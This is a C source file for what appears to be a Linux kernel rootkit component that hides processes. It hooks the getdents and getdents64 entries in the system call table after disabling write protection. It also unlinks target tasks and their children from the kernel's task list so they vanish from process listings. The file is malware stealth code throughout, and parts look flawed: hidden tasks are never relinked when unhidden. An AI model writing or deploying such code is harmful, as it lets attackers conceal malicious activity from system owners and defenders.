#include <linux/slab.h>
#include <linux/pid.h>
#include <linux/sched.h>

#include "hook.h"
#include "pidhide.h"

pid_list_t hidden_pids = {
    .pid  = -1,
    .prev = NULL,
    .next = NULL,
};

pid_list_t_ptr hidden_pids_tail = &hidden_pids;

void
hide_pids(void)
{
    if (atomic_inc_return(&getdents_install_count) == 1) {
        disable_protection();
        sys_calls[__NR_getdents] = (void *)g7_getdents;
        sys_calls[__NR_getdents64] = (void *)g7_getdents64;
        enable_protection();
    }
}

void
unhide_pids(void)
{
    if (atomic_dec_return(&getdents_install_count) < 1) {
        if (sys_getdents) {
            disable_protection();
            sys_calls[__NR_getdents] = (void *)sys_getdents;
            enable_protection();
            while (atomic_read(&getdents_count) > 0);
        }

        if (sys_getdents64) {
            disable_protection();
            sys_calls[__NR_getdents64] = (void *)sys_getdents64;
            enable_protection();
            while (atomic_read(&getdents64_count) > 0);
        }
    }
}


void
hide_pid(pid_t pid)
{
    struct pid *spid;
    struct task_struct *task;

    if (list_contains_pid(&hidden_pids, pid))
        return;

    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
        return;

    struct list_head *i;
    list_for_each(i, &task->children) {
        struct task_struct *child = list_entry(i, struct task_struct, sibling);

        hide_pid(child->pid);
    }

    add_pid_to_list(hidden_pids_tail, pid);

    struct task_struct *ts = pid_task(find_vpid(pid), PIDTYPE_PID);
    struct task_struct *ts2;

    rcu_read_lock();
    for_each_process(ts2) {
        task_lock(ts2);
    }
    list_del(&ts->tasks);
    for_each_process(ts2) {
        task_unlock(ts2);
    }
    rcu_read_unlock();
}

void
unhide_pid(pid_t pid)
{
    struct pid *spid;
    struct task_struct *task;

    pid_list_t_ptr node;
    if (!(node = find_pid_in_list(&hidden_pids, pid)))
        return;

    if (node == &hidden_pids)
        return;

    if ((spid = find_get_pid(pid)) && (task = pid_task(spid, PIDTYPE_PID))) {
        struct list_head *i;
        list_for_each(i, &task->children) {
            struct task_struct *child = list_entry(i, struct task_struct, sibling);

            unhide_pid(child->pid);
        }
    }

    remove_pid_from_list(node, pid);
}

void
clear_hidden_pids(void)
{
    pid_list_t_ptr i = hidden_pids_tail;
    while ((i = remove_pid_from_list(i, i->pid)));
}


bool
list_contains_pid(pid_list_t_ptr list, pid_t pid)
{
    return !!find_pid_in_list(list, pid);
}

pid_list_t_ptr
find_pid_in_list(pid_list_t_ptr head, pid_t pid)
{
    pid_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->pid == pid)
            return i;

    return NULL;
}

pid_list_t_ptr
add_pid_to_list(pid_list_t_ptr tail, pid_t pid)
{
    pid_list_t_ptr node;
    node = (pid_list_t_ptr)kmalloc(sizeof(pid_list_t), GFP_KERNEL);

    if (node) {
        node->pid = pid;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_pids_tail = node;
        return node;
    }

    return NULL;
}

pid_list_t_ptr
remove_pid_from_list(pid_list_t_ptr list, pid_t pid)
{
    pid_list_t_ptr i = find_pid_in_list(list, pid), ret = NULL;

    if (i && (i->pid != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_pids_tail = i->prev ? i->prev : &hidden_pids;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
